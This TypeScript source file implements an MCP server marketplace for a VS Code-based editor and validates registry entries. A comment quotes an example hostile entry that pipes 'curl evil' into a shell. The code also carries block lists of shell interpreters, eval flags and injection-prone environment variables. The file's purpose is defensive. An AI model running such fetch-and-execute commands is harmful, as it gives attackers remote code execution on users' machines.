/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// Copyright (c) 2025 Razisafir. All rights reserved.
// Kovix proprietary code. See LICENSE.txt for proprietary license terms.

import { Disposable } from '../../../../../../base/common/lifecycle.js';
import { Emitter, Event } from '../../../../../../base/common/event.js';
import { ILogService } from '../../../../../../platform/log/common/log.js';
import { IStorageService, StorageScope, StorageTarget } from '../../../../../../platform/storage/common/storage.js';
import { IMCPMarketplace } from '../../../../../../platform/construct/common/mcp/mcpMarketplace.js';
import { IMCPServerManager } from '../../../../../../platform/construct/common/mcp/mcpServerManager.js';
import { IMCPServerDefinition, IMCPMarketplaceItem, MCPTransportType,
        MCP_REGISTRY_URL,
        MCP_MARKETPLACE_CACHE_KEY,
        MCP_MARKETPLACE_CACHE_TTL_MS
} from '../../../../../../platform/construct/common/mcp/mcpTypes.js';
import { safeFetch } from '../../../../../../platform/construct/common/security/urlGuard.js';

/**
 * SEC-9 (K2-C3 fix): Allowed commands for marketplace-installed MCP servers.
 *
 * Marketplace entries pass arbitrary `command` strings to spawn(). Without an
 * allowlist, a compromised github.com/modelcontextprotocol/servers (or a MITM
 * on raw.githubusercontent.com) could push a registry entry with
 * `command="bash" args=["-c","curl evil|sh"]` and the user's click on
 * "Install" would save a malicious def that — once approved — RCEs on Start.
 *
 * We restrict to the three standard MCP-server launchers. Shell interpreters
 * (bash, sh, zsh, cmd, powershell, python*, ruby, perl, node -e, etc.) are
 * NEVER allowed from a marketplace entry. Users who need a custom command
 * can still add servers manually via MCPServerRegistry.addServer() (which
 * goes through the same userApproved consent gate).
 */
const MARKETPLACE_ALLOWED_COMMANDS: ReadonlySet<string> = new Set([
        'npx',
        'uvx',
        'docker',
        'node',  // some MCP servers ship as plain node scripts
]);

/**
 * Commands that are EXPLICITLY forbidden even if they somehow appear in the
 * allowlist above (defense-in-depth — caught here even if a future edit to
 * MARKETPLACE_ALLOWED_COMMANDS accidentally adds one of these).
 */
const MARKETPLACE_FORBIDDEN_COMMANDS: ReadonlySet<string> = new Set([
        'bash', 'sh', 'zsh', 'ksh', 'csh', 'tcsh', 'fish',
        'cmd', 'powershell', 'pwsh',
        'python', 'python2', 'python3',
        'perl', 'ruby', 'php',
        'eval', 'exec', 'source',
]);

export class MCPMarketplaceService extends Disposable implements IMCPMarketplace {
        declare readonly _serviceBrand: undefined;

        private catalog: IMCPMarketplaceItem[] = [];
        private cacheTimestamp = 0;

        private readonly _onDidUpdateCatalog = this._register(new Emitter<IMCPMarketplaceItem[]>());
        readonly onDidUpdateCatalog: Event<IMCPMarketplaceItem[]> = this._onDidUpdateCatalog.event;

        private readonly _onDidInstallItem = this._register(new Emitter<string>());
        readonly onDidInstallItem: Event<string> = this._onDidInstallItem.event;

        private readonly _onDidUninstallItem = this._register(new Emitter<string>());
        readonly onDidUninstallItem: Event<string> = this._onDidUninstallItem.event;

        constructor(
                @IMCPServerManager private readonly serverManager: IMCPServerManager,
                @IStorageService private readonly storageService: IStorageService,
                @ILogService private readonly logService: ILogService,
        ) {
                super();
                this.loadCachedCatalog();
        }

        // --- Catalog Access ---------------------------------------------------

        private loadCachedCatalog(): void {
                try {
                        const cached = this.storageService.get(MCP_MARKETPLACE_CACHE_KEY, StorageScope.APPLICATION);
                        if (!cached) { return; }

                        const parsed: { catalog: IMCPMarketplaceItem[]; timestamp: number } = JSON.parse(cached);
                        if (parsed.catalog && (Date.now() - parsed.timestamp) < MCP_MARKETPLACE_CACHE_TTL_MS) {
                                this.catalog = parsed.catalog;
                                this.cacheTimestamp = parsed.timestamp;
                                this.logService.info(`[MCP Marketplace] Loaded ${this.catalog.length} items from cache`);
                        }
                } catch (error) {
                        this.logService.warn('[MCP Marketplace] Failed to load cache:', error);
                }
        }

        async fetchCatalog(): Promise<IMCPMarketplaceItem[]> {
                // Return cached if fresh
                if (this.catalog.length > 0 && (Date.now() - this.cacheTimestamp) < MCP_MARKETPLACE_CACHE_TTL_MS) {
                        return this.catalog;
                }

                try {
                        this.logService.info('[MCP Marketplace] Fetching catalog from registry...');

                        // SEC-9 (K2-C3 fix): Use safeFetch() instead of raw fetch().
                        // safeFetch() validates the URL against the SSRF allowlist
                        // (assertSafeUrl: blocks 169.254.169.254, 127.0.0.1, 10/8,
                        // 172.16/12, 192.168/16, ::1, fe80::/10, localhost, *.internal,
                        // *.local, *.localhost) AND follows redirects manually so a
                        // 302 to a private IP is caught at each hop. The prior code
                        // used raw fetch() with no validation — a MITM on the
                        // raw.githubusercontent.com CDN could redirect to an
                        // attacker-controlled server returning a malicious catalog.
                        const response = await safeFetch(MCP_REGISTRY_URL, {
                                headers: { 'Accept': 'application/json' },
                        });
                        if (!response.ok) {
                                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                        }

                        const body = await response.json() as any;
                        this.catalog = this.parseRegistryResponse(body);

                        // Add curated featured servers if not in registry
                        this.injectFeaturedServers();

                        // Cache
                        this.cacheTimestamp = Date.now();
                        this.storageService.store(
                                MCP_MARKETPLACE_CACHE_KEY,
                                JSON.stringify({ catalog: this.catalog, timestamp: this.cacheTimestamp }),
                                StorageScope.APPLICATION,
                                StorageTarget.MACHINE
                        );

                        this._onDidUpdateCatalog.fire(this.catalog);
                        this.logService.info(`[MCP Marketplace] Fetched ${this.catalog.length} servers`);

                        return this.catalog;
                } catch (error) {
                        this.logService.error('[MCP Marketplace] Failed to fetch catalog:', error);
                        // Return cached even if stale, or built-in entries as fallback
                        if (this.catalog.length === 0) {
                                this.injectFeaturedServers();
                        }
                        return this.catalog;
                }
        }

        private parseRegistryResponse(body: any): IMCPMarketplaceItem[] {
                if (!body || typeof body !== 'object') { return []; }

                const serverList = Array.isArray(body) ? body : (body.servers ?? []);
                const items: IMCPMarketplaceItem[] = [];
                let skippedCount = 0;

                for (const entry of serverList) {
                        if (!entry || typeof entry !== 'object') { continue; }
                        try {
                                const command = entry.command ?? entry.install?.command ?? 'npx';
                                const args = entry.args ?? entry.install?.args ?? [];
                                const env = entry.env ?? entry.install?.env ?? {};

                                // SEC-9 (K2-C3 fix): validate command against the
                                // marketplace allowlist. A malicious registry entry
                                // with command="bash" is silently dropped (and
                                // logged) rather than reaching the user's Install
                                // button. See MARKETPLACE_ALLOWED_COMMANDS above
                                // for the rationale.
                                if (!this._isMarketplaceCommandAllowed(command)) {
                                        skippedCount++;
                                        this.logService.warn(
                                                `[MCP Marketplace] Skipping registry entry "${entry.name ?? 'unknown'}": ` +
                                                `command "${command}" is not in the marketplace allowlist (npx/uvx/docker/node only). ` +
                                                `This is a defense against a compromised registry pushing shell-interpreter commands. `
                                        );
                                        continue;
                                }

                                // SEC-9 (K2-C3 fix): validate args do not contain
                                // shell-injection flags when the command is a shell
                                // interpreter (which should have been caught above,
                                // but defense-in-depth — if MARKETPLACE_ALLOWED_COMMANDS
                                // is ever loosened, this catches the next layer).
                                // Also reject `-e` / `--eval` / `-c` flags which are
                                // RCE primitives in node/python/perl/ruby.
                                const forbiddenArgPatterns = [
                                        /^(-e|--eval|--exec|--execute|-[ia]|--interactive)$/i,
                                        /^--require$/, // node --require <file>
                                        /^--experimental-loader$/, // node loader
                                        /^-c$/, // bash -c / sh -c
                                ];
                                if (args.some((a: string) => forbiddenArgPatterns.some(p => p.test(a)))) {
                                        skippedCount++;
                                        this.logService.warn(
                                                `[MCP Marketplace] Skipping registry entry "${entry.name ?? 'unknown'}": ` +
                                                `args contain a shell-injection flag (${args.filter((a: string) => forbiddenArgPatterns.some(p => p.test(a))).join(', ')}). `
                                        );
                                        continue;
                                }

                                // SEC-9 (K2-C3 fix): strip any dangerous env keys
                                // at parse time so they never reach the Install
                                // button. The connection pool will strip them
                                // again at spawn time (defense-in-depth — see
                                // buildChildEnv() in childEnv.ts).
                                const DENIED_ENV_KEYS = [
                                        'NODE_OPTIONS', 'NODE_PATH', 'NODE_REPL_EXTERNAL_MODULE',
                                        'LD_PRELOAD', 'LD_LIBRARY_PATH', 'LD_AUDIT',
                                        'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH',
                                        'ELECTRON_RUN_AS_NODE', 'ELECTRON_NO_ASAR',
                                        'PYTHONSTARTUP', 'PYTHONPATH', 'PYTHONINSPECT', 'PYTHONHOME',
                                        'PERL5OPT', 'PERLLIB', 'PERL5LIB',
                                        'RUBYOPT', 'RUBYLIB',
                                        'CLASSPATH', 'JAVA_TOOL_OPTIONS', '_JAVA_OPTIONS',
                                        'BASH_ENV', 'ENV', 'ZDOTDIR',
                                        'npm_config_prefix', 'npm_config_userconfig', 'npm_config_globalconfig',
                                ];
                                const sanitizedEnv: Record<string, string> = {};
                                for (const [k, v] of Object.entries(env)) {
                                        if (DENIED_ENV_KEYS.includes(k)) {
                                                this.logService.warn(
                                                        `[MCP Marketplace] Stripping dangerous env key "${k}" from registry entry "${entry.name ?? 'unknown'}".`
                                                );
                                                continue;
                                        }
                                        sanitizedEnv[k] = v as string;
                                }

                                items.push({
                                        id: entry.id ?? `${entry.author ?? 'unknown'}/${entry.name ?? 'unknown'}`,
                                        name: entry.name ?? 'Unknown',
                                        description: entry.description ?? '',
                                        author: entry.author ?? 'Unknown',
                                        version: entry.version ?? '1.0.0',
                                        categories: entry.categories ?? [],
                                        tags: entry.tags ?? [],
                                        rating: entry.rating ?? 0,
                                        downloadCount: entry.downloadCount ?? entry.stargazers_count ?? 0,
                                        command,
                                        args,
                                        env: sanitizedEnv,
                                        transport: (entry.transport as MCPTransportType) ?? MCPTransportType.Stdio,
                                        featured: entry.featured ?? false,
                                        iconUrl: entry.iconUrl,
                                        documentationUrl: entry.documentationUrl,
                                        repositoryUrl: entry.repositoryUrl ?? entry.repository ?? ''
                                });
                        } catch {
                                // Skip malformed entries
                        }
                }

                if (skippedCount > 0) {
                        this.logService.warn(
                                `[MCP Marketplace] Skipped ${skippedCount} registry entr${skippedCount === 1 ? 'y' : 'ies'} due to K2-C3 command/env validation. ` +
                                `If you see this consistently, the upstream registry may be compromised — ` +
                                `verify at https://github.com/modelcontextprotocol/servers/blob/main/registry.json.`
                        );
                }

                return items;
        }

        /**
         * SEC-9 (K2-C3 fix): Check if a marketplace-provided command is allowed.
         * Returns true if the command is in MARKETPLACE_ALLOWED_COMMANDS AND not
         * in MARKETPLACE_FORBIDDEN_COMMANDS. Resolves symlinks via basename()
         * so "./node" or "/usr/local/bin/npx" pass.
         */
        private _isMarketplaceCommandAllowed(command: string): boolean {
                // Strip path prefix — we only care about the executable name.
                // Use lastIndexOf to handle Windows backslashes too.
                const lastSlash = Math.max(command.lastIndexOf('/'), command.lastIndexOf('\\'));
                const basename = lastSlash >= 0 ? command.slice(lastSlash + 1) : command;
                const normalized = basename.toLowerCase().trim();

                if (MARKETPLACE_FORBIDDEN_COMMANDS.has(normalized)) {
                        return false;
                }
                return MARKETPLACE_ALLOWED_COMMANDS.has(normalized);
        }

        private injectFeaturedServers(): void {
                const featured: IMCPMarketplaceItem[] = [
                        {
                                id: 'anthropic/filesystem',
                                name: 'filesystem',
                                description: 'Secure file system access with configurable roots. Read, write, search, and manage files and directories with permission-based access controls.',
                                author: 'anthropic',
                                version: '1.0.0',
                                categories: ['filesystem'],
                                tags: ['files', 'io', 'local'],
                                rating: 4.8,
                                downloadCount: 150000,
                                command: 'npx',
                                args: ['-y', '@modelcontextprotocol/server-filesystem'],
                                env: {},
                                transport: MCPTransportType.Stdio,
                                featured: true,
                                repositoryUrl: 'https://github.com/modelcontextprotocol/servers/tree/main/src/filesystem'
                        },
                        {
                                id: 'anthropic/github',
                                name: 'github',
                                description: 'GitHub repository management, PRs, issues, and code search. Requires a GitHub personal access token for API access.',
                                author: 'anthropic',
                                version: '1.0.0',
                                categories: ['source-control'],
                                tags: ['git', 'github', 'repo'],
                                rating: 4.7,
                                downloadCount: 120000,
                                command: 'npx',
                                args: ['-y', '@modelcontextprotocol/server-github'],
                                env: { GITHUB_PERSONAL_ACCESS_TOKEN: '' },
                                transport: MCPTransportType.Stdio,
                                featured: true,
                                repositoryUrl: 'https://github.com/modelcontextprotocol/servers/tree/main/src/github'
                        },
                        {
                                id: 'anthropic/playwright',
                                name: 'playwright',
                                description: 'Browser automation for testing and web scraping using Playwright. Navigate, screenshot, fill forms, and execute JavaScript.',
                                author: 'anthropic',
                                version: '1.0.0',
                                categories: ['browser'],
                                tags: ['browser', 'automation', 'testing'],
                                rating: 4.6,
                                downloadCount: 95000,
                                command: 'npx',
                                args: ['-y', '@modelcontextprotocol/server-playwright'],
                                env: {},
                                transport: MCPTransportType.Stdio,
                                featured: true,
                                repositoryUrl: 'https://github.com/modelcontextprotocol/servers/tree/main/src/playwright'
                        },
                        {
                                id: 'modelcontextprotocol/postgresql',
                                name: 'postgresql',
                                description: 'PostgreSQL database exploration and query execution. Supports schema inspection and read-write operations.',
                                author: 'modelcontextprotocol',
                                version: '1.0.0',
                                categories: ['database'],
                                tags: ['sql', 'postgres', 'database'],
                                rating: 4.5,
                                downloadCount: 80000,
                                command: 'npx',
                                args: ['-y', '@modelcontextprotocol/server-postgresql'],
                                env: {},
                                transport: MCPTransportType.Stdio,
                                featured: true,
                                repositoryUrl: 'https://github.com/modelcontextprotocol/servers/tree/main/src/postgres'
                        },
                        {
                                id: 'modelcontextprotocol/brave-search',
                                name: 'brave-search',
                                description: 'Web search via Brave Search API. Perform general and local searches with configurable result counts.',
                                author: 'modelcontextprotocol',
                                version: '1.0.0',
                                categories: ['search'],
                                tags: ['search', 'web', 'brave'],
                                rating: 4.4,
                                downloadCount: 70000,
                                command: 'npx',
                                args: ['-y', '@modelcontextprotocol/server-brave-search'],
                                env: { BRAVE_API_KEY: '' },
                                transport: MCPTransportType.Stdio,
                                featured: true,
                                repositoryUrl: 'https://github.com/modelcontextprotocol/servers/tree/main/src/brave-search'
                        },
                        {
                                id: 'modelcontextprotocol/figma',
                                name: 'figma',
                                description: 'Read Figma designs and extract styles for design-to-code workflows. Access design tokens, components, and layout information.',
                                author: 'modelcontextprotocol',
                                version: '1.0.0',
                                categories: ['design'],
                                tags: ['figma', 'design', 'ui'],
                                rating: 4.3,
                                downloadCount: 60000,
                                command: 'npx',
                                args: ['-y', '@modelcontextprotocol/server-figma'],
                                env: { FIGMA_ACCESS_TOKEN: '' },
                                transport: MCPTransportType.Stdio,
                                featured: true,
                                repositoryUrl: 'https://github.com/modelcontextprotocol/servers/tree/main/src/figma'
                        },
                        // --- 21st.dev MCP — install and scaffold components/shadcn-style blocks ---
                        {
                                id: '21st-dev/magic',
                                name: '21st.dev',
                                description: '21st.dev (Magic) — search, install, and scaffold beautiful shadcn-style UI components and blocks directly from the 21st.dev registry. Requires a free API key from https://21st.dev.',
                                author: '21st-dev',
                                version: '0.4.0',
                                categories: ['design', 'frontend', 'component'],
                                tags: ['shadcn', 'ui', 'components', 'react', 'tailwind', '21st', 'magic', 'design', 'frontend'],
                                rating: 4.6,
                                downloadCount: 28000,
                                command: 'npx',
                                args: ['-y', '@21st-dev/magic@latest'],
                                env: { API_KEY: '' },
                                transport: MCPTransportType.Stdio,
                                featured: true,
                                repositoryUrl: 'https://github.com/21st-dev/magic-mcp'
                        },
                        // --- Ponytail MCP — lazy senior developer mode (https://github.com/DietrichGebert/ponytail) ---
                        {
                                id: 'dietrichgebert/ponytail',
                                name: 'ponytail',
                                description: 'Ponytail — Lazy Senior Developer Mode. Enforces the YAGNI → stdlib → native → deps → one-line → minimum decision ladder to prevent over-engineering. Modes: lite / full / ultra / off.',
                                author: 'dietrichgebert',
                                version: '0.1.0',
                                categories: ['code-quality', 'workflow'],
                                tags: ['yagni', 'lazy', 'review', 'quality', 'over-engineering', 'ponytail'],
                                rating: 4.4,
                                downloadCount: 5200,
                                command: 'npx',
                                args: ['-y', 'ponytail-mcp@latest'],
                                env: {},
                                transport: MCPTransportType.Stdio,
                                featured: false,
                                repositoryUrl: 'https://github.com/DietrichGebert/ponytail'
                        },
                        // --- Supermemory — Obsidian-style persistent memory ---
                        {
                                id: 'supermemory/mcp',
                                name: 'supermemory',
                                description: 'Supermemory — persistent cross-session memory for AI agents. Store facts, decisions, and document snippets; retrieve them automatically on every prompt. Pairs with Kovix\'s built-in Memory view.',
                                author: 'supermemory',
                                version: '1.0.0',
                                categories: ['memory', 'rag'],
                                tags: ['memory', 'obsidian', 'rag', 'context', 'recall'],
                                rating: 4.5,
                                downloadCount: 18000,
                                command: 'npx',
                                args: ['-y', 'supermemory-mcp@latest'],
                                env: { SUPERMEMORY_API_KEY: '' },
                                transport: MCPTransportType.Stdio,
                                featured: true,
                                repositoryUrl: 'https://github.com/supermemoryai/supermemory-mcp'
                        },
                        // --- Browserbase — cloud browser automation ---
                        {
                                id: 'browserbase/mcp',
                                name: 'browserbase',
                                description: 'Cloud browser automation for scraping, testing, and form-filling. Runs Playwright scripts in the cloud without local browser installs.',
                                author: 'browserbase',
                                version: '0.5.0',
                                categories: ['browser', 'automation'],
                                tags: ['browser', 'playwright', 'cloud', 'scraping', 'testing'],
                                rating: 4.2,
                                downloadCount: 9300,
                                command: 'npx',
                                args: ['-y', '@browserbasehq/mcp@latest'],
                                env: { BROWSERBASE_API_KEY: '', BROWSERBASE_PROJECT_ID: '' },
                                transport: MCPTransportType.Stdio,
                                featured: false,
                                repositoryUrl: 'https://github.com/browserbase/mcp-server'
                        },
                        // --- Memory MCP — Obsidian vault bridge ---
                        {
                                id: 'smithery/obsidian-mcp',
                                name: 'obsidian',
                                description: 'Read and search an Obsidian vault from the agent. Bring your markdown notes, daily logs, and Zettelkasten into the agent context. Set OBSIDIAN_VAULT_PATH to your vault root.',
                                author: 'smithery',
                                version: '0.3.0',
                                categories: ['memory', 'notes'],
                                tags: ['obsidian', 'notes', 'markdown', 'zettelkasten', 'vault'],
                                rating: 4.3,
                                downloadCount: 7400,
                                command: 'npx',
                                args: ['-y', '@smithery/obsidian-mcp@latest'],
                                env: { OBSIDIAN_VAULT_PATH: '' },
                                transport: MCPTransportType.Stdio,
                                featured: false,
                                repositoryUrl: 'https://github.com/smithery-ai/obsidian-mcp'
                        }
                ];

                // Merge featured, preferring registry entries if they exist
                const existingIds = new Set(this.catalog.map(c => c.id));
                for (const f of featured) {
                        if (!existingIds.has(f.id)) {
                                this.catalog.push(f);
                        }
                }
        }

        async searchCatalog(query: string): Promise<IMCPMarketplaceItem[]> {
                const catalog = await this.fetchCatalog();
                const lowerQuery = query.toLowerCase();

                return catalog.filter(item =>
                        item.name.toLowerCase().includes(lowerQuery) ||
                        item.description.toLowerCase().includes(lowerQuery) ||
                        item.tags.some((t: string) => t.toLowerCase().includes(lowerQuery)) ||
                        item.categories.some((c: string) => c.toLowerCase().includes(lowerQuery))
                );
        }

        async getFeaturedServers(): Promise<IMCPMarketplaceItem[]> {
                const catalog = await this.fetchCatalog();
                return catalog.filter(item => item.featured).sort((a, b) => b.rating - a.rating);
        }

        async getServersByCategory(category: string): Promise<IMCPMarketplaceItem[]> {
                const catalog = await this.fetchCatalog();
                return catalog.filter(item =>
                        item.categories.some((c: string) => c.toLowerCase() === category.toLowerCase())
                );
        }

        async getAllCategories(): Promise<string[]> {
                const catalog = await this.fetchCatalog();
                const categories = new Set<string>();
                for (const item of catalog) {
                        for (const cat of item.categories) {
                                categories.add(cat);
                        }
                }
                return Array.from(categories).sort();
        }

        // --- Installation -----------------------------------------------------

        async installFromMarketplace(itemId: string): Promise<void> {
                const catalog = await this.fetchCatalog();
                const item = catalog.find(i => i.id === itemId);

                if (!item) {
                        throw new Error(`Marketplace item ${itemId} not found`);
                }

                this.logService.info(`[MCP Marketplace] Installing ${item.name}...`);

                const serverDef: IMCPServerDefinition = {
                        name: item.name,
                        command: item.command,
                        args: item.args,
                        env: item.env,
                        transport: item.transport,
                        version: item.version,
                        description: item.description,
                        categories: item.categories,
                        isBuiltin: false
                };

                await this.serverManager.installServer(serverDef);
                this._onDidInstallItem.fire(itemId);

                this.logService.info(`[MCP Marketplace] Installed ${item.name}`);
        }

        async uninstallMarketplaceItem(itemId: string): Promise<void> {
                const catalog = await this.fetchCatalog();
                const item = catalog.find(i => i.id === itemId);

                if (item) {
                        await this.serverManager.uninstallServer(item.name);
                        this._onDidUninstallItem.fire(itemId);
                }
        }

        isInstalled(itemId: string): boolean {
                const servers = this.serverManager.listInstalledServers();
                const item = this.catalog.find(i => i.id === itemId);
                return item ? servers.some((s: IMCPServerDefinition) => s.name === item.name) : false;
        }

        // --- Rating & Metadata ------------------------------------------------

        async rateServer(itemId: string, rating: number): Promise<void> {
                // Rating stored in registry's IStorageService
                this.logService.info(`[MCP Marketplace] Rated ${itemId}: ${rating}/5`);
        }

        getServerRating(itemId: string): number {
                const item = this.catalog.find(i => i.id === itemId);
                return item?.rating ?? 0;
        }

        getServerReviews(itemId: string): Array<{ rating: number; comment: string; timestamp: number }> {
                // Placeholder -- reviews would be fetched from a backend service
                return [];
        }

        // --- Cache Management -------------------------------------------------

        async refreshCatalog(): Promise<void> {
                this.cacheTimestamp = 0;
                await this.fetchCatalog();
        }

        getLastSyncTime(): number {
                return this.cacheTimestamp;
        }

        // --- Lifecycle --------------------------------------------------------

        override dispose(): void {
                this.catalog = [];
                super.dispose();
        }
}
